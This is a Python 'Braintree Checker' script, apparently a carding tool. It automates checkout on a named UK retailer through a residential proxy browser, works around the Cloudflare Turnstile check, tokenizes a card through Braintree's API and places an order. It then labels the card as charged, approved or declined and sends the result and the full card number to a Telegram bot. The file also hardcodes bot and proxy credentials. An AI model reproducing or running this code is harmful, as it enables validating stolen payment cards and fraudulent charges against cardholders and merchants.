#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Braintree Checker v3 — Playwright + curl_cffi + Screenshot
"""

import os
import re
import time
import json
import random
import requests
import traceback
from datetime import datetime

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    HAS_CFFI = False

# ═══════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════
BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

BT_BASE_URL = "https://www.flue-warehouse.co.uk"
BT_PRODUCT_URL = f"{BT_BASE_URL}/twinwallflue/dinakdwtwinwallchimneysystems/125mm5inchdinakflue/chimneynoticeplate"
BT_CHECKOUT_URL = f"{BT_BASE_URL}/checkout"
BT_GRAPHQL = "https://payments.braintree-api.com/graphql"

TEST_CARD = "5126693793783705|08|2030|560"


# ═══════════════════════════════════════════════════
# Telegram Helpers
# ═══════════════════════════════════════════════════
def tg_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text[:4000]},
            timeout=15
        )
    except Exception as e:
        print(f"TG msg error: {e}", flush=True)


def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        print(f"TG photo error: {e}", flush=True)


# ═══════════════════════════════════════════════════
# Main Debug
# ═══════════════════════════════════════════════════
def run_debug():
    tg_msg("🚀 Braintree v3 — Starting...")

    # Parse card
    parts = TEST_CARD.split("|")
    number = parts[0].strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    if len(yy) == 4:
        yy = yy[2:]
    cvv = parts[3].strip()

    first = "James"
    last = "Smith"
    email = f"user{random.randint(10000, 99999)}@gmail.com"
    phone = f"+44{random.randint(7000000000, 7999999999)}"
    address = "123 High Street"
    city = "London"
    postcode = "EC1A 1BB"

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    # ═══════════════════════════════════════
    # STEP 1: Connect Playwright
    # ═══════════════════════════════════════
    tg_msg("🔄 [1/9] Connecting to BrightData...")
    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ [1/9] Connected")
    except Exception as e:
        tg_msg(f"❌ [1/9] Failed: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-GB",
    )
    page = context.new_page()
    page.set_default_timeout(60000)

    # ═══════════════════════════════════════
    # STEP 2: Product Page
    # ═══════════════════════════════════════
    tg_msg("🔄 [2/9] Opening product page...")
    try:
        page.goto(BT_PRODUCT_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(2)
        tg_msg(f"✅ [2/9] Loaded: {page.title()[:60]}")
    except Exception as e:
        tg_msg(f"❌ [2/9] Failed: {str(e)[:200]}")
        page.screenshot(path="/tmp/error.png")
        tg_photo("/tmp/error.png", "[2/9] Product page error")
        return

    # ═══════════════════════════════════════
    # STEP 3: Add to Cart
    # ═══════════════════════════════════════
    tg_msg("🔄 [3/9] Adding to cart...")
    try:
        page.click("button.single_add_to_cart_button", timeout=10000)
        time.sleep(3)
        tg_msg("✅ [3/9] Added to cart")
    except Exception as e:
        tg_msg(f"⚠️ [3/9] Cart failed: {str(e)[:100]}")

    # ═══════════════════════════════════════
    # STEP 4: Checkout Page
    # ═══════════════════════════════════════
    tg_msg("🔄 [4/9] Opening checkout...")
    try:
        page.goto(BT_CHECKOUT_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(4)
        tg_msg(f"✅ [4/9] Checkout: {page.title()[:60]}")
    except Exception as e:
        tg_msg(f"❌ [4/9] Failed: {str(e)[:200]}")
        page.screenshot(path="/tmp/error.png")
        tg_photo("/tmp/error.png", "[4/9] Checkout error")
        return

    # ═══════════════════════════════════════
    # STEP 5: Wait for Turnstile
    # ═══════════════════════════════════════
    tg_msg("🔄 [5/9] Waiting for Turnstile (max 90s)...")
    turnstile_token = None
    ts_start = time.time()
    ts_found = False

    while time.time() - ts_start < 90:
        try:
            token = page.evaluate(
                "document.querySelector('[name=cf-turnstile-response]')?.value || ''"
            )
            if token and len(token) > 20:
                turnstile_token = token
                ts_found = True
                break
        except:
            pass

        # حرّك الماوس
        try:
            for _ in range(2):
                page.mouse.move(
                    random.randint(100, 1200),
                    random.randint(100, 700),
                    steps=3
                )
                time.sleep(0.2)
        except:
            pass

        # جرّب اضغط على Turnstile checkbox
        try:
            for frame in page.frames:
                furl = (frame.url or "").lower()
                if "challenges.cloudflare" in furl or "turnstile" in furl:
                    try:
                        cb = frame.locator("input[type='checkbox'], label, .cb-lb").first
                        if cb.count() > 0:
                            cb.click(timeout=2000)
                    except:
                        pass
        except:
            pass

        time.sleep(2)

    if not ts_found:
        tg_msg("❌ [5/9] Turnstile TIMEOUT — Taking screenshot...")
        try:
            page.screenshot(path="/tmp/timeout.png", full_page=True)
            tg_photo("/tmp/timeout.png", "❌ [5/9] Turnstile timeout — Full page")
        except:
            pass
        try:
            context.close()
        except:
            pass
        try:
            browser.close()
        except:
            pass
        try:
            pw.stop()
        except:
            pass
        return

    tg_msg(f"✅ [5/9] Turnstile SOLVED — Token: {len(turnstile_token)} chars")

    # ═══════════════════════════════════════
    # STEP 6: Extract cookies + Braintree token
    # ═══════════════════════════════════════
    tg_msg("🔄 [6/9] Extracting session + Braintree token...")

    try:
        cookies = context.cookies()
    except:
        cookies = []

    try:
        bt_token = page.evaluate("""() => {
            if (window.wc_braintree_client_token) {
                const t = window.wc_braintree_client_token;
                return Array.isArray(t) ? t[0] : t;
            }
            return null;
        }""")
    except:
        bt_token = None

    try:
        wc_nonce = page.evaluate("""() => {
            const el = document.querySelector('[name=woocommerce-process-checkout-nonce]');
            return el ? el.value : null;
        }""")
    except:
        wc_nonce = None

    if not bt_token:
        tg_msg("❌ [6/9] No Braintree token")
        page.screenshot(path="/tmp/error.png")
        tg_photo("/tmp/error.png", "[6/9] No Braintree token")
        return

    tg_msg(f"✅ [6/9] Got: cookies={len(cookies)}, bt_token={len(bt_token)}, wc_nonce={'yes' if wc_nonce else 'no'}")

    # ═══════════════════════════════════════
    # STEP 7: Tokenize card via Braintree GraphQL
    # ═══════════════════════════════════════
    tg_msg("🔄 [7/9] Tokenizing card via Braintree...")

    if not HAS_CFFI:
        tg_msg("❌ [7/9] curl_cffi not installed")
        return

    session = cffi_requests.Session(impersonate="chrome124")
    session.headers.update({
        'accept-language': 'en-GB,en;q=0.9',
        'user-agent': ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
    })

    # Add cookies
    for c in cookies:
        try:
            session.cookies.set(
                c['name'], c['value'],
                domain=c.get('domain', 'www.flue-warehouse.co.uk'),
                path=c.get('path', '/')
            )
        except:
            pass

    # GraphQL tokenize
    auth = "Bearer " + bt_token if not bt_token.startswith("Bearer ") else bt_token

    tokenize_payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin2",
            "sessionId": str(random.randint(100000, 999999))
        },
        "query": ("mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { "
                  "tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 "
                  "expirationMonth expirationYear binData { prepaid debit commercial issuingBank "
                  "countryOfIssuance productId } } } }"),
        "variables": {
            "input": {
                "creditCard": {
                    "number": number,
                    "expirationMonth": mm,
                    "expirationYear": "20" + yy,
                    "cvv": cvv,
                    "billingAddress": {"postalCode": postcode}
                },
                "options": {"validate": False}
            }
        },
        "operationName": "TokenizeCreditCard"
    }

    tokenize_headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'authorization': auth,
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
    }

    try:
        r = session.post(BT_GRAPHQL, json=tokenize_payload,
                         headers=tokenize_headers, timeout=25)
        tokenize_data = r.json()
    except Exception as e:
        tg_msg(f"❌ [7/9] Tokenize exception: {str(e)[:200]}")
        return

    if tokenize_data.get('errors'):
        msg = tokenize_data['errors'][0].get('message', 'unknown')
        low = msg.lower()
        tg_msg(f"❌ [7/9] Tokenize error: {msg[:200]}")

        if 'insufficient' in low:
            tg_msg("💵 STATUS: APPROVED (Insufficient Funds)")
        elif 'cvv' in low:
            tg_msg("💵 STATUS: APPROVED (CVV)")
        else:
            tg_msg(f"❌ STATUS: DECLINE — {msg[:100]}")
        return

    node = (tokenize_data.get('data') or {}).get('tokenizeCreditCard') or {}
    cc = node.get('creditCard') or {}
    bd = cc.get('binData') or {}
    bin_info = (f"{cc.get('brandCode','?')} {cc.get('bin','?')}xxxx{cc.get('last4','?')} "
                f"{'DEBIT' if bd.get('debit') else 'CREDIT'} "
                f"[{bd.get('issuingBank','?')}/{bd.get('countryOfIssuance','?')}]")
    nonce = node.get('token')

    if not nonce:
        tg_msg("❌ [7/9] No nonce returned")
        return

    tg_msg(f"✅ [7/9] Nonce: {nonce[:20]}... | BIN: {bin_info}")

    # ═══════════════════════════════════════
    # STEP 8: Place Order via curl_cffi
    # ═══════════════════════════════════════
    tg_msg("🔄 [8/9] Placing order via curl_cffi...")

    device_data = json.dumps({"correlation_id": str(random.randint(100000, 999999))})

    from urllib.parse import quote
    order_data = (
        "wc_order_attribution_source_type=typein"
        f"&wc_order_attribution_referrer={quote(BT_PRODUCT_URL, safe='')}"
        "&wc_order_attribution_utm_campaign=(none)"
        "&wc_order_attribution_utm_source=(direct)"
        "&wc_order_attribution_utm_medium=(none)"
        "&wc_order_attribution_utm_content=(none)"
        "&wc_order_attribution_utm_id=(none)"
        "&wc_order_attribution_utm_term=(none)"
        "&wc_order_attribution_utm_source_platform=(none)"
        "&wc_order_attribution_utm_creative_format=(none)"
        "&wc_order_attribution_utm_marketing_tactic=(none)"
        f"&wc_order_attribution_session_entry={quote(BT_PRODUCT_URL, safe='')}"
        f"&wc_order_attribution_session_start_time={quote(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}"
        "&wc_order_attribution_session_pages=6"
        "&wc_order_attribution_session_count=1"
        f"&billing_first_name={first}&billing_last_name={last}"
        f"&billing_country=GB&billing_address_1={quote(address, safe='')}"
        f"&billing_city={quote(city, safe='')}&billing_state=Greater+London"
        f"&billing_postcode={quote(postcode, safe='')}"
        f"&billing_phone={quote(phone, safe='')}&billing_email={quote(email, safe='')}"
        f"&shipping_first_name={first}&shipping_last_name={last}"
        f"&shipping_country=GB&shipping_address_1={quote(address, safe='')}"
        f"&shipping_city={quote(city, safe='')}&shipping_state=Greater+London"
        f"&shipping_postcode={quote(postcode, safe='')}&shipping_phone={quote(phone, safe='')}"
        "&order_comments=&shipping_method%5B0%5D=table_rate%3A189"
        "&payment_method=braintree_cc"
        f"&braintree_cc_nonce_key={nonce}"
        f"&braintree_cc_device_data={quote(device_data, safe='')}"
        "&braintree_cc_3ds_nonce_key=&braintree_cc_config_data="
        "&braintree_applepay_nonce_key=&braintree_applepay_device_data="
        f"&cf-turnstile-response={turnstile_token}"
        f"&woocommerce-process-checkout-nonce={wc_nonce or ''}"
        "&_wp_http_referer=%2Fcheckout"
    )

    order_headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': BT_BASE_URL,
        'referer': BT_CHECKOUT_URL,
        'x-requested-with': 'XMLHttpRequest',
    }

    try:
        r2 = session.post(f"{BT_BASE_URL}/?wc-ajax=checkout",
                          data=order_data, headers=order_headers, timeout=30)
        resp_text = r2.text
        tg_msg(f"📥 [8/9] Response received ({len(resp_text)} chars)")
    except Exception as e:
        tg_msg(f"❌ [8/9] Order exception: {str(e)[:200]}")
        return

    # ═══════════════════════════════════════
    # STEP 9: Parse Result
    # ═══════════════════════════════════════
    tg_msg("🔄 [9/9] Parsing result...")

    status = "UNKNOWN"
    message = ""

    try:
        j = json.loads(resp_text)

        if j.get('result') == 'success':
            status = "CHARGE"
            message = "Charged"
        elif j.get('redirect'):
            status = "CHARGE"
            message = "Charged"
        else:
            # اقرا الرسائل
            msgs = []
            def walk(o):
                if isinstance(o, str):
                    if o.strip():
                        msgs.append(o)
                elif isinstance(o, dict):
                    for v in o.values():
                        walk(v)
                elif isinstance(o, list):
                    for v in o:
                        walk(v)
            walk(j)
            joined = " ".join(msgs)
            low = joined.lower()

            if 'insufficient' in low:
                status = "APPROVED"
                message = "Insufficient Funds"
            elif 'cvv' in low:
                status = "APPROVED"
                message = "CVV"
            elif 'pick up card' in low:
                status = "DECLINE"
                message = "Pick Up Card"
            elif 'do not honor' in low:
                status = "DECLINE"
                message = "Do Not Honor"
            elif 'declined' in low:
                status = "DECLINE"
                message = "Declined"
            elif 'expired' in low:
                status = "DECLINE"
                message = "Expired Card"
            elif 'nonce more than once' in low:
                status = "CHARGE"
                message = "Charged (nonce reused)"
            else:
                # استخرج من HTML
                err = re.search(r'<[^>]*class="[^"]*woocommerce-error[^"]*"[^>]*>(.*?)</', resp_text, re.DOTALL)
                if err:
                    message = re.sub(r'<[^>]+>', '', err.group(1)).strip()[:100]
                    status = "DECLINE"
                else:
                    message = joined[:100] if joined else "unknown"
                    status = "DECLINE"
    except:
        low = resp_text.lower()
        if 'thank' in low or 'order-received' in low:
            status = "CHARGE"
            message = "Charged"
        elif 'insufficient' in low:
            status = "APPROVED"
            message = "Insufficient Funds"
        else:
            status = "DECLINE"
            message = resp_text[:100]

    # ═══════════════════════════════════════
    # FINAL
    # ═══════════════════════════════════════
    emoji = {"CHARGE": "🔥", "APPROVED": "💵", "DECLINE": "❌"}.get(status, "⚠️")
    tg_msg(
        f"{emoji} FINAL RESULT\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"Status: {status}\n"
        f"Message: {message}\n"
        f"BIN: {bin_info}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"Card: {TEST_CARD}"
    )

    # لو CHARGE، خد screenshot
    if status == "CHARGE":
        try:
            page.goto(BT_CHECKOUT_URL, timeout=30000)
            time.sleep(3)
            page.screenshot(path="/tmp/success.png", full_page=True)
            tg_photo("/tmp/success.png", "🔥 CHARGED SUCCESS")
        except:
            pass

    # Cleanup
    try:
        context.close()
    except:
        pass
    try:
        browser.close()
    except:
        pass
    try:
        pw.stop()
    except:
        pass


# ═══════════════════════════════════════════════════
# ENTRY
# ═══════════════════════════════════════════════════
if __name__ == "__main__":
    try:
        run_debug()
    except Exception as e:
        err = f"❌ FATAL:\n{e}\n\n{traceback.format_exc()}"
        print(err, flush=True)
        tg_msg(err[:3900])
